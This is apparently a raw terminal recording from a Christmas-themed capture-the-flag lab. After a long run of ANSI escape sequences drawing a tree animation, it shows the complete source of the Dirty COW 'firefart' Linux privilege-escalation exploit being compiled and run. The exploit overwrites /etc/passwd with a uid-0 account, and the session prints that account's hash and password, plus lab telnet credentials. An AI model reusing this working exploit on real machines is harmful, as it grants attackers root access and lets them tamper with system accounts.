+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[9;52H*
+[37m[1m[8;51Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[6;49H*
+[30m[1m[11;46Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[9;52H*
+[31m[1m[4;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[12;45H*
+[32m[1m[12;39Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[5;46H*
+[33m[1m[10;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[5;48H*
+[34m[1m[4;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[6;47H*
+[35m[1m[12;49Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[12;53H*
+[36m[1m[10;49Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[7;50H*
+[37m[1m[11;50Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[5;46H*
+[30m[1m[9;44Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[7;44H*
+[31m[1m[12;49Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[9;44H*
+[32m[1m[5;46Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[5;46H*
+[33m[1m[8;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[5;46H*
+[34m[1m[6;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[11;46H*
+[35m[1m[10;45Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[4;47H*
+[36m[1m[8;49Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[11;48H*
+[37m[1m[4;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[6;47H*
+[30m[1m[11;44Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[7;50H*
+[31m[1m[5;46Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[7;48H*
+[32m[1m[4;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[4;47H*
+[33m[1m[5;46Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[34m[1m[12;51Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[35m[1m[11;48Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[36m[1m[8;43Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[37m[1m[5;46Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[30m[1m[9;48Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[31m[1m[9;48Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[4;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[33m[1m[4;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[34m[1m[12;51Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[35m[1m[7;48Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[36m[1m[5;46Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[37m[1m[9;48Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[30m[1m[5;46Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[31m[1m[7;44Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[4;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[33m[1m[10;51Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[34m[1m[11;54Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[35m[1m[9;46Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[36m[1m[12;43Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[37m[1m[9;42Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[30m[1m[11;52Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[31m[1m[4;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[11;42Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[33m[1m[5;46Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[34m[1m[5;46Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[35m[1m[11;48Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[36m[1m[5;48Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[37m[1m[9;46Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[30m[1m[10;51Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[31m[1m[4;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[7;46Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[33m[1m[12;41Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[34m[1m[11;44Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[35m[1m[5;46Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[36m[1m[8;49Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[12;51H*
+[37m[1m[4;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[11;48H*
+[30m[1m[9;48Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[8;43H*
+[31m[1m[8;51Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[5;46H*
+[32m[1m[11;44Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[9;48H*
+[33m[1m[12;51Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[9;48H*
+[34m[1m[4;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[4;47H*
+[35m[1m[11;40Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[4;47H*
+[36m[1m[5;46Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[12;51H*
+[37m[1m[7;44Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[7;48H*
+[30m[1m[12;45Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[5;46H*
+[31m[1m[4;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[9;48H*
+[32m[1m[12;45Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[5;46H*
+[33m[1m[4;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[7;44H*
+[34m[1m[11;50Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[4;47H*
+[35m[1m[6;45Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[10;51H*
+[36m[1m[4;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[11;54H*
+[37m[1m[11;50Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[9;46H*
+[30m[1m[5;46Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[12;43H*
+[31m[1m[8;51Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[9;42H*
+[32m[1m[5;46Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[11;52H*
+[33m[1m[12;51Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[4;47H*
+[34m[1m[7;50Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[11;42H*
+[35m[1m[5;46Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[5;46H*
+[36m[1m[12;43Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[5;46H*
+[37m[1m[4;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[11;48H*
+[30m[1m[4;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[5;48H*
+[31m[1m[5;46Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[9;46H*
+[32m[1m[11;46Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[10;51H*
+[33m[1m[8;43Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[4;47H*
+[34m[1m[9;48Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[7;46H*
+[35m[1m[10;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[12;41H*
+[36m[1m[10;45Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[11;44H*
+[37m[1m[6;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[5;46H*
+[30m[1m[11;40Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[8;49H*
+[31m[1m[12;49Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[5;48Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[33m[1m[5;46Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[34m[1m[8;43Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[35m[1m[11;42Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[36m[1m[10;41Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[37m[1m[9;52Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[30m[1m[12;55Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[31m[1m[9;50Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[10;51Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[33m[1m[10;43Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[34m[1m[11;52Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[35m[1m[11;40Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[36m[1m[10;45Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[37m[1m[5;46Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[30m[1m[11;52Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[31m[1m[10;49Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[11;52Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[33m[1m[7;44Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[34m[1m[4;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[35m[1m[9;52Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[36m[1m[11;48Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[37m[1m[4;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[30m[1m[12;49Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[31m[1m[9;48Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[7;44Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[33m[1m[11;40Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[34m[1m[8;43Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[35m[1m[12;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[36m[1m[8;43Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[37m[1m[10;41Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[30m[1m[7;48Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[31m[1m[9;52Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[4;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+^Cc[!p[?3;4l[4l>[?12l[?25h$ clear
+[H[2J$ cat ^H^H^H^H            h^H   ls
+christmas.sh  cookies_and_milk.txt  dirty.c
+$ nano dirty.c
+[?1049h[1;19r(B[m[4l[?7h[?12l[?25h[?1h=[?1h=[?1h=[39;49m[39;49m(B[m[H[2J(B[0;7m  GNU nano 2.2.6                   File: dirty.c                                             [3;1H(B[0;1m[34m/*[4d####################### dirtyc0w.c #######################[5d$ sudo -s[6d# echo this is not a test > foo[7d# chmod 0404 foo[8d$ ls -lah foo[9d-r-----r-- 1 root root 19 Oct 20 15:23 foo[10d$ cat foo[11dthis is not a test[12d$ gcc -pthread dirtyc0w.c -o dirtyc0w[13d$ ./dirtyc0w foo m00000000000000000[14dmmap 56123000[15dmadvise 0[16dprocselfmem 1800000000[17;38H[39m(B[0;7m[ Read 114 lines ][18d^G(B[m Get Help    (B[0;7m^O(B[m WriteOut    (B[0;7m^R(B[m Read File   (B[0;7m^Y(B[m Prev Page   (B[0;7m^K(B[m Cut Text    (B[0;7m^C(B[m Cur Pos[19d(B[0;7m^X(B[m Exit[19;16H(B[0;7m^J(B[m Justify     (B[0;7m^W(B[m Where Is    (B[0;7m^V(B[m Next Page   (B[0;7m^U(B[m UnCut Text  (B[0;7m^T(B[m To Spell[3d[1;84H(B[0;7mModified[3d(B[m*[K[4d####################### dirtyc0w.c #######################[5d$ sudo -s[6d# echo [32mthis[39m(B[m is not a test > foo[7d# chmod 0404 foo[8d$ ls -lah foo[9d-r-----r-- 1 root root 19 Oct 20 15:23 foo[10d$ cat foo[11d[32mthis[39m(B[m is not a test[12d$ gcc -pthread dirtyc0w.c -o dirtyc0w[13d$ ./dirtyc0w foo m00000000000000000[14dmmap 56123000[15dmadvise 0[16dprocselfmem 1800000000[3d[K[2;16r[16;1H
+[1;19r[3;1H[8P[16d$ cat foo[3d[3P[6P[8P[17d[K[3d[4P[4P[4P[3;19H[K[3;14H[K[3;11H[K[8G[K#[K[4;17r[17;1H
+[1;19r[3;1H -s[16dm00000000000000000[3d[3;17r[17;1H
+[1;19r[16;1H####################### dirtyc0w.c #######################[3d[4P[12P[3Pfoo[K[4;17r[17;1H
+[1;19r[3;1H foo[16d*/[3d[4;17r[17;1H
+[1;19r[3;1Hs -lah foo[16d(B[0;1m[36m#include[39m(B[m (B[0;1m[33m<stdio.h>[3d[39m(B[moo[K[4;17r[17;1H
+[1;19r[3;1H--r-- 1 root root 19 Oct 20 15:23 foo[16d(B[0;1m[36m#include[39m(B[m (B[0;1m[33m<sys/mman.h>[3d[39m(B[m[4P[4P[8P[12P3 foo[K[3;17r[17;1H[2S[1;19r[15;1H(B[0;1m[36m#include[39m(B[m (B[0;1m[33m<fcntl.h>[16d[36m#include[39m(B[m (B[0;1m[33m<pthread.h>[3d[39m(B[mis[2P[17d(B[0;7mSave modified buffer (ANSWERING "No" WILL DESTROY CHANGES) ?                                 [18;1H Y(B[m Yes[K[19d(B[0;7m N(B[m No  [19;16H (B[0;7m^C(B[m Cancel[K[17;62H[18d[J[19;93H[19;1H[?1049l[?1l>$ 
+$ rm dirty.c
+$ nano dirty.c
+[?1049h[1;19r(B[m[4l[?7h[?12l[?25h[?1h=[?1h=[?1h=[39;49m[39;49m(B[m[H[2J(B[0;7m  GNU nano 2.2.6                   File: dirty.c                                             [17;41H[ New File ][18d^G(B[m Get Help    (B[0;7m^O(B[m WriteOut    (B[0;7m^R(B[m Read File   (B[0;7m^Y(B[m Prev Page   (B[0;7m^K(B[m Cut Text    (B[0;7m^C(B[m Cur Pos[19d(B[0;7m^X(B[m Exit[19;16H(B[0;7m^J(B[m Justify     (B[0;7m^W(B[m Where Is    (B[0;7m^V(B[m Next Page   (B[0;7m^U(B[m UnCut Text  (B[0;7m^T(B[m To Spell[3d[1;84H(B[0;7mModified[3d(B[mgcc -pthread dirty.c -o dirty -lcrypt[17d[K[3;38H [31G[K[K[3;18H[Kg[K[K(B[0;1m[34m//[5d[36m#include[39m(B[m (B[0;1m[33m<fcntl.h>[6d[36m#include[39m(B[m (B[0;1m[33m<pthread.h>[7d[36m#include[39m(B[m (B[0;1m[33m<string.h>[8d[36m#include[39m(B[m (B[0;1m[33m<stdio.h>[9d[36m#include[39m(B[m (B[0;1m[33m<stdint.h>[10d[36m#include[39m(B[m (B[0;1m[33m<sys/mman.h>[11d[36m#include[39m(B[m <sys/typ[3d  }[5d  [32mstruct[39m(B[m Userinfo user;[6d  (B[0;1m[34m// set values, change as needed[7d[39m(B[m  user.username = (B[0;1m[33m"firefart"[39m(B[m;[8d  user.user_id = 0;[9d  user.group_id = 0;[10d  user.info = (B[0;1m[33m"pwned"[39m(B[m;[11d  user.home_dir = (B[0;1m[33m"/root"[39m(B[m;[12;3Huser.shell = (B[0;1m[33m"/bin/bash"[39m(B[m[4;3H(B[0;1m[33melse[39m(B[m {[5;3H  pthread_create(&pth,[6;19H[1K (B[0;1m[31mNULL[39m(B[m,[K[7;19H[1K madviseThread,[8;19H[1K (B[0;1m[31mNULL[39m(B[m);[9;3H  ptrace((B[0;1m[31mPTRACE_TRACEME[39m(B[m);[10;3H  kill(getpid(), (B[0;1m[31mSIGSTO[11d[39m(B[m[K[12d[K[10;26H[2;10r[2;1H[2T[1;19r[3;5Hkill(getpid(), (B[0;1m[31mSIGSTOP[39m(B[m);[4;5Hpthread_join(pth,(B[0;1m[31mNULL[39m(B[m);[6d[K[7d  printf((B[0;1m[33m"Done! Check %s to see if the new user was created.\n"[39m(B[m, filename);[8;3Hprintf((B[0;1m[33m"You can log in with the username '%s' and the password '%s'.\n\n"[39m(B[m,[9;5Huser.username, plaintext_pw);[10;5Hprintf((B[0;1m[33m"\nDON'T FORGET TO RESTORE! $ mv %s %s\n"[39m(B[m,[11;5Hbackup_filename, filename);[12;3H[35mreturn[39m(B[m 0;[13d}[17d(B[0;7mSave modified buffer (ANSWERING "No" WILL DESTROY CHANGES) ?                                 [18;1H Y(B[m Yes[K[19d(B[0;7m N(B[m No  [19;16H (B[0;7m^C(B[m Cancel[K[17;62H(B[0;7mFile Name to Write: dirty.c                                 [18d^G(B[m Get Help[18;24H(B[0;7mM-D(B[m DOS Format[18;47H(B[0;7mM-A(B[m Append[18;70H(B[0;7mM-B(B[m Backup File[19d(B[0;7m^C(B[m Cancel[17G       (B[0;7mM-M(B[m Mac Format[19;47H(B[0;7mM-P(B[m Prepend[17;28H[18d[39;49m(B[m[J[1;84H(B[0;7m        [17;37H(B[m[1K (B[0;7m[ Wrote 193 lines ](B[m[K[19;93H[19;1H[?1049l[?1l>$ clear
+[H[2J$ ls
+christmas.sh  cookies_and_milk.txt  dirty.c
+$ cat dirty.c
+//
+// This exploit uses the pokemon exploit of the dirtycow vulnerability
+// as a base and automatically generates a new passwd line.
+// The user will be prompted for the new password when the binary is run.
+// The original /etc/passwd file is then backed up to /tmp/passwd.bak
+// and overwrites the root account with the generated line.
+// After running the exploit you should be able to login with the newly
+// created user.
+//
+// To use this exploit modify the user values according to your needs.
+//   The default is "firefart".
+//
+// Original exploit (dirtycow's ptrace_pokedata "pokemon" method):
+//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c
+//
+// Compile with:
+//   gcc -pthread dirty.c -o dirty -lcrypt
+//
+// Then run the newly create binary by either doing:
+//   "./dirty" or "./dirty my-new-password"
+//
+// Afterwards, you can either "su firefart" or "ssh firefart@..."
+//
+// DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!
+//   mv /tmp/passwd.bak /etc/passwd
+//
+// Exploit adopted by Christian "FireFart" Mehlmauer
+// https://firefart.at
+//
+
+#include <fcntl.h>
+#include <pthread.h>
+#include <string.h>
+#include <stdio.h>
+#include <stdint.h>
+#include <sys/mman.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/wait.h>
+#include <sys/ptrace.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <crypt.h>
+
+const char *filename = "/etc/passwd";
+const char *backup_filename = "/tmp/passwd.bak";
+const char *salt = "firefart";
+
+int f;
+void *map;
+pid_t pid;
+pthread_t pth;
+struct stat st;
+
+struct Userinfo {
+   char *username;
+   char *hash;
+   int user_id;
+   int group_id;
+   char *info;
+   char *home_dir;
+   char *shell;
+};
+
+char *generate_password_hash(char *plaintext_pw) {
+  return crypt(plaintext_pw, salt);
+}
+
+char *generate_passwd_line(struct Userinfo u) {
+  const char *format = "%s:%s:%d:%d:%s:%s:%s\n";
+  int size = snprintf(NULL, 0, format, u.username, u.hash,
+    u.user_id, u.group_id, u.info, u.home_dir, u.shell);
+  char *ret = malloc(size + 1);
+  sprintf(ret, format, u.username, u.hash, u.user_id,
+    u.group_id, u.info, u.home_dir, u.shell);
+  return ret;
+}
+
+void *madviseThread(void *arg) {
+  int i, c = 0;
+  for(i = 0; i < 200000000; i++) {
+    c += madvise(map, 100, MADV_DONTNEED);
+  }
+  printf("madvise %d\n\n", c);
+}
+
+int copy_file(const char *from, const char *to) {
+  // check if target file already exists
+  if(access(to, F_OK) != -1) {
+    printf("File %s already exists! Please delete it and run again\n",
+      to);
+    return -1;
+  }
+
+  char ch;
+  FILE *source, *target;
+
+  source = fopen(from, "r");
+  if(source == NULL) {
+    return -1;
+  }
+  target = fopen(to, "w");
+  if(target == NULL) {
+     fclose(source);
+     return -1;
+  }
+
+  while((ch = fgetc(source)) != EOF) {
+     fputc(ch, target);
+   }
+
+  printf("%s successfully backed up to %s\n",
+    from, to);
+
+  fclose(source);
+  fclose(target);
+
+  return 0;
+}
+
+int main(int argc, char *argv[])
+{
+  // backup file
+  int ret = copy_file(filename, backup_filename);
+  if (ret != 0) {
+    exit(ret);
+  }
+
+  struct Userinfo user;
+  // set values, change as needed
+  user.username = "firefart";
+  user.user_id = 0;
+  user.group_id = 0;
+  user.info = "pwned";
+  user.home_dir = "/root";
+  user.shell = "/bin/bash";
+
+  char *plaintext_pw;
+
+  if (argc >= 2) {
+    plaintext_pw = argv[1];
+    printf("Please enter the new password: %s\n", plaintext_pw);
+  } else {
+    plaintext_pw = getpass("Please enter the new password: ");
+  }
+
+  user.hash = generate_password_hash(plaintext_pw);
+  char *complete_passwd_line = generate_passwd_line(user);
+  printf("Complete line:\n%s\n", complete_passwd_line);
+
+  f = open(filename, O_RDONLY);
+  fstat(f, &st);
+  map = mmap(NULL,
+             st.st_size + sizeof(long),
+             PROT_READ,
+             MAP_PRIVATE,
+             f,
+             0);
+  printf("mmap: %lx\n",(unsigned long)map);
+  pid = fork();
+  if(pid) {
+    waitpid(pid, NULL, 0);
+    int u, i, o, c = 0;
+    int l=strlen(complete_passwd_line);
+    for(i = 0; i < 10000/l; i++) {
+      for(o = 0; o < l; o++) {
+        for(u = 0; u < 10000; u++) {
+          c += ptrace(PTRACE_POKETEXT,
+                      pid,
+                      map + o,
+                      *((long*)(complete_passwd_line + o)));
+        }
+      }
+    }
+    printf("ptrace %d\n",c);
+  }
+  else {
+    pthread_create(&pth,
+                   NULL,
+                   madviseThread,
+                   NULL);
+    ptrace(PTRACE_TRACEME);
+    kill(getpid(), SIGSTOP);
+    pthread_join(pth,NULL);
+  }
+
+  printf("Done! Check %s to see if the new user was created.\n", filename);
+  printf("You can log in with the username '%s' and the password '%s'.\n\n",
+    user.username, plaintext_pw);
+    printf("\nDON'T FORGET TO RESTORE! $ mv %s %s\n",
+    backup_filename, filename);
+  return 0;
+}
+$ clear
+[H[2J$ gcc -pthread dirty.c -o dirty -lcrypt
+$ ls
+christmas.sh  cookies_and_milk.txt  dirty  dirty.c
+$ ./dirty
+/etc/passwd successfully backed up to /tmp/passwd.bak
+Please enter the new password: 
+Complete line:
+firefart:fiGINmZ0V146o:0:0:pwned:/root:/bin/bash
+
+mmap: 7fb34365c000
+ls
+madvise 0
+
+ptrace 0
+Done! Check /etc/passwd to see if the new user was created.
+You can log in with the username 'firefart' and the password '12034rv'.
+
+
+DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
+Done! Check /etc/passwd to see if the new user was created.
+You can log in with the username 'firefart' and the password '12034rv'.
+
+
+DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
+$ christmas.sh  cookies_and_milk.txt  dirty  dirty.c
+$ ^C
+$ ^C
+$ exit
+Trying 10.10.148.69...
+Connected to 10.10.148.69.
+Escape character is '^]'.
+HI SANTA!!! 
+
+We knew you were coming and we wanted to make
+it easy to drop off presents, so we created
+an account for you to use.
+
+Username: santa
+Password: clauschristmas
+
+We left you cookies and milk!
+
+christmas login: 
